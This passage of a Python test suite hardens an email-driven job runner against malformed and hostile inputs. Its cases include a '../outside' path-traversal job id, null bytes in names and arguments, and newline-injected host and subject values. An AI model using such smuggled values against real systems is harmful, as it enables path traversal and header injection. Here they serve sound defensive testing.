            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("rev-1", json.load(fh))

    def test_non_dict_review_is_dropped(self):
        with tempfile.TemporaryDirectory() as d:
            with mock.patch("runner.runner._review.review_job",
                            return_value={"notes", "not-a-dict"}):
                poll_once(self._cfg(d), d, {}, os.path.join(d, "seen.json"),
                          imap=_IMAP(self._ping("rev-2")), smtp=_SMTP(),
                          opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("rev-2", json.load(fh))

    def test_two_workers_claim_one_task(self):
        with tempfile.TemporaryDirectory() as d:
            board = os.path.join(d, "board.json")
            with open(board, "w", encoding="utf-8") as fh:
                json.dump({"only": {
                    "task_id": "only", "state": "open",
                    "priority": 1, "requires": [], "capabilities": [],
                    "compartments": [], "submitted_at": _now(),
                }}, fh)
            req = sign_payload({
                "v": 1, "type": "task_request", "issued_at": _now(),
                "capabilities": [],
            }, SECRET)
            raws = [
                _mail("[HOMING-PIGEON] task_request a", req),
                _mail("[HOMING-PIGEON] task_request b", req),
            ]
            opts = _Workers()
            poll_once(self._cfg(d), d, {}, os.path.join(d, "seen.json"),
                      imap=_MultiIMAP(raws), smtp=_SMTP(), opts=opts)
            with open(board, encoding="utf-8") as fh:
                tasks = json.load(fh)
            claimed = [t for t in tasks.values()
                       if isinstance(t, dict) and t.get("state") == "claimed"]
            self.assertEqual(len(claimed), 1)

    def test_string_resource_event_does_not_stop_the_poll(self):
        with tempfile.TemporaryDirectory() as d:
            with mock.patch("runner.runner._resources.check_resources",
                            return_value="hot"):
                poll_once(self._cfg(d), d, {}, os.path.join(d, "seen.json"),
                          imap=_IMAP(self._ping("res-1")), smtp=_SMTP(),
                          opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("res-1", json.load(fh))


class TraversalAndDoubleCompleteTest(unittest.TestCase):
    """Finding: save_retained joined the job_id onto the path.

    load_retained refused an unsafe id. save_retained did not. A
    job_id of ../outside was already rejected by execute_job, so it
    did not land. The write is refused now too, so a later caller
    cannot miss the check.
    """

    def test_traversal_job_id_is_rejected_and_writes_nothing(self):
        from runner.runner import save_retained
        with tempfile.TemporaryDirectory() as d:
            outside = os.path.join(d, "outside")
            os.makedirs(outside)
            body = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "../outside", "issued_at": _now(),
            }, SECRET)
            raw = _mail("[HOMING-PIGEON] job ../outside", body)
            cfg = {"mailbox_user": "pigeon-test@example.com",
                   "shared_secret": SECRET, "base_dir": d}
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            self.assertFalse(os.path.exists(os.path.join(outside, ".json")))
            self.assertFalse(os.path.exists(os.path.join(d, "outside.json")))
            save_retained(d, "../outside", {"stdout": FLAG})
            self.assertFalse(os.path.exists(os.path.join(outside, ".json")))
            seen_path = os.path.join(d, "seen.json")
            blob = ""
            if os.path.exists(seen_path):
                with open(seen_path, encoding="utf-8") as fh:
                    blob = fh.read()
            self.assertNotIn(FLAG, blob)

    def test_two_completes_of_one_task_do_not_crash(self):
        with tempfile.TemporaryDirectory() as d:
            board = os.path.join(d, "board.json")
            with open(board, "w", encoding="utf-8") as fh:
                json.dump({"only": {
                    "task_id": "only", "state": "claimed",
                    "claimed_by": "a", "priority": 1,
                    "requires": [], "capabilities": [],
                    "compartments": [], "submitted_at": _now(),
                }}, fh)
            done = sign_payload({
                "v": 1, "type": "task_result", "task_id": "only",
                "issued_at": _now(), "result": {"ok": True},
            }, SECRET)
            raws = [
                _mail("[HOMING-PIGEON] task_result only", done),
                _mail("[HOMING-PIGEON] task_result only", done),
            ]
            cfg = {"mailbox_user": "pigeon-test@example.com",
                   "shared_secret": SECRET, "base_dir": d, "workers": 4}
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_MultiIMAP(raws), smtp=_SMTP(), opts=_Workers())
            with open(board, encoding="utf-8") as fh:
                tasks = json.load(fh)
            self.assertIn(tasks["only"]["state"], ("done", "claimed"))

    def test_bad_profile_floor_does_not_raise(self):
        from runner import senses as S
        reason = S.gate_alert(
            {"profile": {"severity_floor": "nope", "cooldown_sec": "hot"}},
            {"severity": "low", "title": "t"}, [])
        self.assertTrue(reason is None or isinstance(reason, str))


class RedactAndSeenFaultTest(unittest.TestCase):
    """Finding: redact_patterns_extra was iterated as a dict.

    A string or a list crashed the job path on .items(). It is
    ignored now. seen.json as a dict used to be read as empty;
    the ids are kept.
    """

    def test_bad_redact_extra_does_not_stop_the_ping(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "redact-1", "issued_at": _now(),
            }, SECRET)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET, "base_dir": d,
                "redact_patterns_extra": ["not", "a", "map"],
            }
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(_mail("[HOMING-PIGEON] job redact-1", body)),
                      smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("redact-1", json.load(fh))

    def test_seen_dict_is_kept(self):
        from runner.runner import load_seen
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "seen.json")
            with open(path, "w", encoding="utf-8") as fh:
                json.dump({"already": True, "done": 1}, fh)
            seen = load_seen(path)
            self.assertIn("already", seen)
            self.assertIn("done", seen)

    def test_no_secrets_attest_with_a_list_of_patterns(self):
        from runner.runner import build_attestations
        atts = build_attestations(
            [{"op": "attest", "predicate": "no_secrets"}],
            {"text": FLAG, "patterns": ["not-a-dict"], "exit_code": 0},
        )
        self.assertTrue(atts)
        self.assertNotIn(FLAG, json.dumps(atts))


class PatternAndRateFaultTest(unittest.TestCase):
    """Finding: redact and the secret scan only caught re.error.

    A pattern that is a number raises TypeError from re.search.
    That crashed a no_secrets attestation and a redacted view.
    Any exception is skipped now. A query whose answering raises
    is rejected; the poll continues.
    """

    def test_numeric_pattern_does_not_crash_redact_or_scan(self):
        from runner.runner import redact_text, secret_scan, build_attestations
        text, families = redact_text(FLAG, {"bad": 5, "ok": "FLAG"})
        self.assertNotIn(FLAG, text)
        self.assertIn("ok", families)
        hits = secret_scan(FLAG, {"bad": 5})
        self.assertIsInstance(hits, list)
        atts = build_attestations(
            [{"op": "attest", "predicate": "no_secrets"}],
            {"text": FLAG, "patterns": {"bad": 5}, "exit_code": 0},
        )
        self.assertTrue(atts)
        self.assertNotIn(FLAG, json.dumps(atts))

    def test_concurrent_rate_limit_does_not_crash(self):
        from runner.runner import check_rate_limit
        import threading
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "query_times.json")
            cfg = {"max_queries_per_hour": 5}
            errors = []

            def hit():
                try:
                    check_rate_limit("k", cfg, path)
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=hit) for _ in range(20)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [])

    def test_raising_query_is_rejected_not_retried(self):
        with tempfile.TemporaryDirectory() as d:
            retained = os.path.join(d, "retained")
            os.makedirs(retained)
            with open(os.path.join(retained, "job-1.json"), "w", encoding="utf-8") as fh:
                json.dump({"stdout": "ok", "budget": 8, "spent": 0,
                           "saved_at": time.time()}, fh)
            body = sign_payload({
                "v": 1, "type": "query", "job_id": "job-1",
                "issued_at": _now(), "queries": [{"op": "attest"}],
            }, SECRET)
            raw = _mail("[HOMING-PIGEON] query q-1", body)
            cfg = {"mailbox_user": "pigeon-test@example.com",
                   "shared_secret": SECRET, "base_dir": d}
            with mock.patch("runner.runner.answer_queries",
                            side_effect=RuntimeError("query on fire")):
                poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                          imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("query:q-1", json.load(fh))


class BoardAndEventFaultTest(unittest.TestCase):
    """Finding: a dict in compartments crashed the offer.

    set() raises TypeError on an unhashable. The worker raised and
    the cycle failed. Only strings are intersected now. A security
    event that cannot be serialized is dropped, not fatal.
    """

    def test_unhashable_compartment_does_not_crash(self):
        with tempfile.TemporaryDirectory() as d:
            board = os.path.join(d, "board.json")
            with open(board, "w", encoding="utf-8") as fh:
                json.dump({"only": {
                    "task_id": "only", "state": "open",
                    "compartments": [{"not": "a string"}],
                    "capabilities": [], "requires": [],
                    "submitted_at": _now(),
                }}, fh)
            req = sign_payload({
                "v": 1, "type": "task_request", "issued_at": _now(),
                "capabilities": [],
            }, SECRET)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET, "base_dir": d,
                "worker_compartments": {"worker-1": ["ops"]},
            }
            raw = _mail("[HOMING-PIGEON] task_request worker-1", req)
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            with open(board, encoding="utf-8") as fh:
                tasks = json.load(fh)
            self.assertIn("only", tasks)

    def test_unserializable_event_is_dropped(self):
        from runner.runner import _append_security_event
        with tempfile.TemporaryDirectory() as d:
            _append_security_event(d, {"type": "x", "detail": {"not", "json"}})
            path = os.path.join(d, "security-events.jsonl")
            if os.path.exists(path):
                with open(path, encoding="utf-8") as fh:
                    self.assertNotIn("not", fh.read())

    def test_concurrent_event_appends_do_not_crash(self):
        from runner.runner import _append_security_event
        import threading
        with tempfile.TemporaryDirectory() as d:
            errors = []

            def write(i):
                try:
                    _append_security_event(d, {"type": "n", "i": i})
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=write, args=(i,)) for i in range(15)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [])


class AskInstructionFaultTest(unittest.TestCase):
    """Finding: owner_instructions that is not a string crashed ask.

    The prompt called .strip() on it before ask_model's own try.
    A declared ask on a job then retried forever. The value is
    coerced, and a raise becomes inference_error.
    """

    def test_numeric_instructions_do_not_crash_ask(self):
        from runner.runner import ask_model, answer_queries
        cfg = {"endpoint": "http://127.0.0.1:11434/v1", "model": "m"}
        got = ask_model(cfg, "q", "out", 20, opener=lambda *a, **k: (_ for _ in ()).throw(RuntimeError("no")),
                        instructions=5)
        self.assertEqual(got.get("rejected"), "inference_error")
        answers, spent = answer_queries(
            [{"op": "ask", "question": "why"}],
            {"stdout": "ok", "stderr": ""}, {}, 4,
            cfg={"inference": cfg, "owner_instructions": 5},
        )
        self.assertEqual(spent, 1)
        self.assertEqual(answers[0].get("rejected"), "inference_error")
        self.assertNotIn("Traceback", json.dumps(answers))


class PartialResultFaultTest(unittest.TestCase):
    """Finding: the result builder cast exit_code and duration raw.

    int(None) and float('hot') raise. A process with no return code,
    or an extension that returned a partial result, retried the job
    forever. The casts fall back now. The job completes.
    """

    def test_partial_result_still_completes(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "partial-1", "issued_at": _now(),
            }, SECRET)

            def partial(cfg, job, base_dir):
                return {"stdout": None, "exit_code": None,
                        "duration_sec": "hot"}

            with mock.patch("runner.runner.execute_job", side_effect=partial):
                poll_once(
                    {"mailbox_user": "pigeon-test@example.com",
                     "shared_secret": SECRET, "base_dir": d},
                    d, {}, os.path.join(d, "seen.json"),
                    imap=_IMAP(_mail("[HOMING-PIGEON] job partial-1", body)),
                    smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("partial-1", json.load(fh))


class NanAndDirectoryFaultTest(unittest.TestCase):
    """Finding: json.dumps emits NaN, which is not JSON.

    A duration of nan signed a result the other side could not
    parse, and the job was marked seen. NaN and Infinity become
    null before signing. A senses store or a board that is a
    directory does not stop the poll.
    """

    def test_nan_duration_still_signs(self):
        from runner.runner import sign_payload, verify_body
        body = sign_payload({
            "v": 1, "type": "result", "duration_sec": float("nan"),
            "score": float("inf"), "note": "ok",
        }, SECRET)
        self.assertNotIn("NaN", body)
        self.assertNotIn("Infinity", body)
        parsed = verify_body(body, SECRET)
        self.assertIsNone(parsed["duration_sec"])
        self.assertEqual(parsed["note"], "ok")

    def test_directory_stores_do_not_stop_the_poll(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, "senses.jsonl"))
            os.makedirs(os.path.join(d, "board.json"))
            os.makedirs(os.path.join(d, "dri-state.json"))
            body = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "dir-1", "issued_at": _now(),
                "result_policy": {"queries": [{"op": "senses"}]},
            }, SECRET)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET, "base_dir": d,
                "dri": {"enabled": True, "triggers": {
                    "sensor_fused_score": {"threshold": "hot"}}},
            }
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(_mail("[HOMING-PIGEON] job dir-1", body)),
                      smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("dir-1", json.load(fh))


class SnapshotAndSubjectFaultTest(unittest.TestCase):
    """Finding: a workspace of / makes the snapshot walk the disk.

    The parent of / is /. The poll stalls. The walk is refused
    when the parent is the filesystem root. A newline in a
    subject used to raise from the email header and retry the
    job. The newline is stripped.
    """

    def test_root_workspace_does_not_walk(self):
        from runner.runner import snapshot_outside
        snap = snapshot_outside("/")
        self.assertEqual(snap, {})

    def test_newline_subject_does_not_raise(self):
        from runner.runner import send_mail
        sent = {}

        class S:
            def send_message(self, msg):
                sent["subject"] = msg["Subject"]

        send_mail(S(), {"mailbox_user": "a@b.c"},
                  "result\r\nbad", "body")
        self.assertNotIn("\n", sent["subject"])
        self.assertNotIn("\r", sent["subject"])


class OAuthShapeFaultTest(unittest.TestCase):
    """Finding: a non-object token response crashed the refresh.

    body.get on a list raises AttributeError. That is not
    OAuthRefreshError, so the poll treated a dead token as
    transient and retried every cycle. A non-object is now the
    auth-dead error. A non-ASCII token fails the same way
    instead of UnicodeEncodeError mid-poll.
    """

    def test_list_token_response_is_auth_dead(self):
        from runner.oauth import refresh_access_token, OAuthRefreshError
        class R:
            def read(self):
                return b"[1, 2, 3]"
            def __enter__(self):
                return self
            def __exit__(self, *a):
                return False
        with mock.patch("urllib.request.urlopen", return_value=R()):
            with self.assertRaises(OAuthRefreshError):
                refresh_access_token({
                    "oauth_client_id": "c", "oauth_refresh_token": "r"})

    def test_non_ascii_token_is_auth_dead(self):
        from runner.oauth import xoauth2_raw, OAuthRefreshError
        with self.assertRaises(OAuthRefreshError):
            xoauth2_raw("a@b.c", "tok\u2603")


class ConfigShapeFaultTest(unittest.TestCase):
    """Finding: a config file that is a JSON list crashed startup.

    load_config returned the list. The next cfg.get raised
    AttributeError and the process died with a traceback. A
    non-object is a config error now. The process exits 2.
    """

    def test_list_config_is_rejected(self):
        from runner.runner import load_config
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "config.json")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write("[1, 2, 3]")
            with self.assertRaises(RuntimeError):
                load_config(path)

    def test_string_config_is_rejected(self):
        from runner.runner import load_config
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "config.json")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write('"just a string"')
            with self.assertRaises(RuntimeError):
                load_config(path)


class ViewShapeFaultTest(unittest.TestCase):
    """Finding: a view that is not a string crashed the result policy.

    VIEW_ORDER.get on a dict raises TypeError. The job retried
    forever. A non-string view is full. The job completes.
    """

    def test_dict_view_does_not_stop_the_job(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "view-1", "issued_at": _now(),
                "result_policy": {"view": {"not": "a string"}},
            }, SECRET)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET, "base_dir": d,
                "max_result_view": ["also", "bad"],
            }
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(_mail("[HOMING-PIGEON] job view-1", body)),
                      smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("view-1", json.load(fh))


class RedactAndPortFaultTest(unittest.TestCase):
    """Finding: _redact_patterns(None) raised AttributeError.

    The PR that named it did not fix it. A None cfg is the
    built-in patterns now. A port that is a word is a config
    error, not a ValueError mid-poll.
    """

    def test_redact_patterns_none_returns_builtins(self):
        from runner.runner import _redact_patterns, BUILTIN_REDACT_PATTERNS
        pats = _redact_patterns(None)
        self.assertEqual(set(pats), set(BUILTIN_REDACT_PATTERNS))

    def test_word_port_is_a_config_error(self):
        from runner.runner import _port
        with self.assertRaises(RuntimeError):
            _port({"imap_port": "abc"}, "imap_port", 993)
        self.assertEqual(_port({}, "imap_port", 993), 993)
        self.assertEqual(_port({"smtp_port": "587"}, "smtp_port", 25), 587)


class ScriptShapeFaultTest(unittest.TestCase):
    """Finding: a numeric script retried the job forever.

    An int is truthy. fh.write(5) raises TypeError, which the
    job path treats as transient. A script that is not a string
    is rejected. The job is marked seen.
    """

    def test_numeric_script_is_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "exec",
                "job_id": "script-1", "issued_at": _now(),
                "script": 5,
                "interpreter": ["sh"],
            }, SECRET)
            cfg = {"mailbox_user": "pigeon-test@example.com",
                   "shared_secret": SECRET, "base_dir": d}
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(_mail("[HOMING-PIGEON] job script-1", body)),
                      smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("script-1", json.load(fh))


class NullByteNameFaultTest(unittest.TestCase):
    """Finding: a null byte in a file name retried the job forever.

    os.path.realpath raises ValueError. That is not JobRejected,
    so the job path treated it as transient. It is poison. The
    job is rejected and marked seen.
    """

    def test_null_byte_name_is_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "exec",
                "job_id": "null-1", "issued_at": _now(),
                "script": "echo hi",
                "interpreter": ["sh"],
                "files": [{"name": "a\x00b", "url": "https://example.invalid/x"}],
            }, SECRET)
            cfg = {"mailbox_user": "pigeon-test@example.com",
                   "shared_secret": SECRET, "base_dir": d}
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(_mail("[HOMING-PIGEON] job null-1", body)),
                      smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("null-1", json.load(fh))


class EnvNameFaultTest(unittest.TestCase):
    """Finding: an env name with '=' or a null crashed Popen.

    ValueError is not JobRejected, so the job retried forever.
    Those names are poison. The job is rejected and marked seen.
    """

    def test_equals_in_env_name_is_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "exec",
                "job_id": "env-1", "issued_at": _now(),
                "script": "echo hi",
                "interpreter": ["sh"],
                "env": {"A=B": "x"},
            }, SECRET)
            cfg = {"mailbox_user": "pigeon-test@example.com",
                   "shared_secret": SECRET, "base_dir": d}
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(_mail("[HOMING-PIGEON] job env-1", body)),
                      smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("env-1", json.load(fh))


class NullArgFaultTest(unittest.TestCase):
    """Finding: a null byte in an arg crashed Popen.

    ValueError is not OSError, so the job path treated it as
    transient and retried forever. A null in an arg or an
    interpreter element is poison. The job is rejected.
    """

    def test_null_in_arg_is_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "exec",
                "job_id": "arg-1", "issued_at": _now(),
                "script": "echo hi",
                "interpreter": ["sh"],
                "args": ["ok", "bad\x00name"],
            }, SECRET)
            cfg = {"mailbox_user": "pigeon-test@example.com",
                   "shared_secret": SECRET, "base_dir": d}
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(_mail("[HOMING-PIGEON] job arg-1", body)),
                      smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("arg-1", json.load(fh))


class SeenWriteFaultTest(unittest.TestCase):
    """Finding: save_seen wrote the file in place.

    Two writers could tear it. The next load then saw nothing and
    re-ran every job. The write is atomic now. A missing process
    output is an empty string, not a crash.
    """

    def test_concurrent_seen_writes_stay_readable(self):
        from runner.runner import save_seen, load_seen
        import threading
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "seen.json")
            errors = []

            def write(i):
                try:
                    save_seen(path, {f"id-{i}-{n}": True for n in range(50)})
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=write, args=(i,)) for i in range(12)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [])
            seen = load_seen(path)
            self.assertTrue(seen)


class LogFaultTest(unittest.TestCase):
    """Finding: log() printed with no guard.

    A closed stdout raises from print. That happened while holding
    the mail lock and failed the poll cycle. Logging must not kill
    the runner. The print is swallowed. The file still gets the line.
    """

    def test_closed_stdout_does_not_raise(self):
        from runner import runner as R
        R._LOG_COUNT = 0
        R._LOG_DROPPED = 0
        with mock.patch("builtins.print", side_effect=ValueError("closed")):
            R.log("hello")
            R.log({"not": "a string"})
            R.log("warn", "WARN")


class WorkerCapFaultTest(unittest.TestCase):
    """Finding: workers had no ceiling.

    A config of 1000000 tried to build a million-thread pool and
    stalled the poll. The cap is 32. A non-string log preview is
    coerced, not crashed.
    """

    def test_huge_worker_count_is_capped(self):
        from runner.runner import _worker_count
        class FakeArgs:
            workers = 1000000
        self.assertEqual(_worker_count({"workers": 1000000}, None), 32)
        self.assertEqual(_worker_count({}, FakeArgs()), 32)
        self.assertEqual(_worker_count({"workers": 0}, None), 1)
        self.assertEqual(_worker_count({"workers": "nope"}, None), 1)

    def test_numeric_preview_does_not_raise(self):
        from runner.runner import _preview
        self.assertEqual(_preview(5), "5")
        self.assertEqual(_preview(None), "")


class BoardCountAndHostFaultTest(unittest.TestCase):
    """Finding: counts() walked the task dict with no lock.

    A submit on another thread raised RuntimeError: dictionary
    changed size during iteration. counts copies under the lock.
    A missing host is a config error, not a KeyError.
    """

    def test_concurrent_counts_during_submit(self):
        from runner.runner import Board
        import threading
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            errors = []

            def submit(i):
                try:
                    board.submit({
                        "task_id": f"t-{i}", "priority": 1,
                        "capabilities": [], "compartments": [],
                    })
                except Exception as e:
                    errors.append(e)

            def count():
                try:
                    for _ in range(30):
                        board.counts()
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=count) for _ in range(4)]
            threads += [threading.Thread(target=submit, args=(i,)) for i in range(40)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [])

    def test_missing_host_is_a_config_error(self):
        from runner.runner import _host
        with self.assertRaises(RuntimeError):
            _host({}, "imap_host")
        with self.assertRaises(RuntimeError):
            _host({"smtp_host": 5}, "smtp_host")
        self.assertEqual(_host({"imap_host": " imap.gmail.com "}, "imap_host"),
                         "imap.gmail.com")


class RetainedDumpFaultTest(unittest.TestCase):
    """Finding: save_retained dumped the payload raw.

    A set inside the review dict made json.dump raise TypeError.
    The job retried forever. The dump is guarded and NaN is
    stripped. A bad payload is dropped, not fatal.
    """

    def test_set_in_retained_does_not_raise(self):
        from runner.runner import save_retained, load_retained
        with tempfile.TemporaryDirectory() as d:
            save_retained(d, "job-1", {"stdout": "ok", "review": {"x": {1, 2}}})
            got = load_retained(d, "job-1")
            self.assertTrue(got is None or isinstance(got, dict))

    def test_nan_in_retained_is_stripped(self):
        from runner.runner import save_retained, load_retained
        with tempfile.TemporaryDirectory() as d:
            save_retained(d, "job-2", {"duration_sec": float("nan"), "ok": True})
            got = load_retained(d, "job-2")
            self.assertIsInstance(got, dict)
            self.assertIsNone(got.get("duration_sec"))


class HashAndOracleFaultTest(unittest.TestCase):
    """Finding: sha384_of raised on a directory.

    IsADirectoryError is not JobRejected, so a hash of an
    unreadable path retried the job forever. The hash is empty
    on OSError, and the compare rejects. A None cfg must not
    crash the Oracle server builder.
    """

    def test_hash_of_directory_is_empty(self):
        from runner.runner import sha384_of
        with tempfile.TemporaryDirectory() as d:
            self.assertEqual(sha384_of(d), "")
            self.assertEqual(sha384_of(os.path.join(d, "missing")), "")

    def test_none_cfg_does_not_crash_oracle(self):
        from runner.runner import make_oracle_server
        httpd = make_oracle_server(None, "127.0.0.1", 0)
        try:
            self.assertTrue(httpd.socket.getsockname()[1] > 0)
        finally:
            httpd.server_close()


class SeenLockFaultTest(unittest.TestCase):
    """Finding: the query path wrote seen with no lock.

    Two workers marking two queries could race. The write is
    under the mail lock now. A poll with a non-dict seen does
    not crash.
    """

    def test_concurrent_query_seen_writes(self):
        import threading
        with tempfile.TemporaryDirectory() as d:
            retained = os.path.join(d, "retained")
            os.makedirs(retained)
            with open(os.path.join(retained, "job-1.json"), "w", encoding="utf-8") as fh:
                json.dump({"stdout": "ok", "budget": 8, "spent": 0,
                           "saved_at": time.time()}, fh)
            seen = {}
            errors = []

            def one(i):
                try:
                    body = sign_payload({
                        "v": 1, "type": "query", "job_id": "job-1",
                        "issued_at": _now(), "queries": [{"op": "attest", "predicate": "exit_zero"}],
                    }, SECRET)
                    raw = _mail(f"[HOMING-PIGEON] query q-{i}", body)
                    poll_once(
                        {"mailbox_user": "pigeon-test@example.com",
                         "shared_secret": SECRET, "base_dir": d},
                        d, seen, os.path.join(d, "seen.json"),
                        imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=one, args=(i,)) for i in range(8)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [])
            self.assertTrue(any(k.startswith("query:") for k in seen))

    def test_non_dict_seen_does_not_crash(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "seen-1", "issued_at": _now(),
            }, SECRET)
            poll_once(
                {"mailbox_user": "pigeon-test@example.com",
                 "shared_secret": SECRET, "base_dir": d},
                d, None, os.path.join(d, "seen.json"),
                imap=_IMAP(_mail("[HOMING-PIGEON] job seen-1", body)),
                smtp=_SMTP(), opts=_Opts())


class HostAndResultFaultTest(unittest.TestCase):
    """Finding: a newline in a host reached the socket.

    And a set in a board result made json.dump raise, which
    rejected the message. The host is rejected. The result is
    stored JSON-safe.
    """

    def test_newline_host_is_rejected(self):
        from runner.runner import _host
        with self.assertRaises(RuntimeError):
            _host({"imap_host": "imap.gmail.com\ninjected"}, "imap_host")
        self.assertEqual(_host({"smtp_host": "smtp.gmail.com"}, "smtp_host"),
                         "smtp.gmail.com")

    def test_set_result_does_not_crash_complete(self):
        from runner.runner import Board
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            board.submit({"task_id": "t-1", "capabilities": []})
            board.offer("w", [], "", {})
            status, _why = board.complete("t-1", {"detail": {1, 2}})
            self.assertEqual(status, "done")
            with open(os.path.join(d, "board.json"), encoding="utf-8") as fh:
                tasks = json.load(fh)
            self.assertEqual(tasks["t-1"]["state"], "done")


class MailboxFaultTest(unittest.TestCase):
    """Finding: a missing mailbox_user was a KeyError mid-poll.

    The identity log and the login indexed it. A missing user is
    a config error now. A password that is not a string is too.
    """

    def test_missing_user_is_a_config_error(self):
        from runner.runner import _mailbox
        with self.assertRaises(RuntimeError):
            _mailbox({})
        with self.assertRaises(RuntimeError):
            _mailbox({"mailbox_user": 5})
        self.assertEqual(_mailbox({"mailbox_user": " a@b.c "}), "a@b.c")

    def test_missing_user_does_not_crash_the_identity_log(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "user-1", "issued_at": _now(),
            }, SECRET)
            # No mailbox_user. The identity log must not raise.
            # The connect is not reached because imap is injected.
            poll_once(
                {"shared_secret": SECRET, "base_dir": d},
                d, {}, os.path.join(d, "seen.json"),
                imap=_IMAP(_mail("[HOMING-PIGEON] job user-1", body)),
                smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("user-1", json.load(fh))


class BaseDirFaultTest(unittest.TestCase):
    """Finding: a null in base_dir retried the job forever.

    os.makedirs raises ValueError on an embedded null. That is
    not OSError, so the job path treated it as transient. It is
    poison. The job is rejected.
    """

    def test_null_in_base_dir_is_rejected(self):
        from runner.runner import execute_job, JobRejected
        with self.assertRaises(JobRejected):
            execute_job(
                {"shared_secret": SECRET},
                {"kind": "ping", "job_id": "ok"},
                "base\x00dir",
            )

    def test_non_string_base_dir_is_rejected(self):
        from runner.runner import execute_job, JobRejected
        with self.assertRaises(JobRejected):
            execute_job({"shared_secret": SECRET},
                        {"kind": "ping", "job_id": "ok"}, None)


class StateWriteFaultTest(unittest.TestCase):
    """Finding: resource and DRI state used one shared temp name.

    Two writers could tear the file. The next load then saw
    nothing and re-paged. Each writer has its own temp and a
    lock. Concurrent writes stay readable.
    """

    def test_concurrent_resource_state_writes(self):
        from runner import resources
        import threading
        with tempfile.TemporaryDirectory() as d:
            errors = []

            def write(i):
                try:
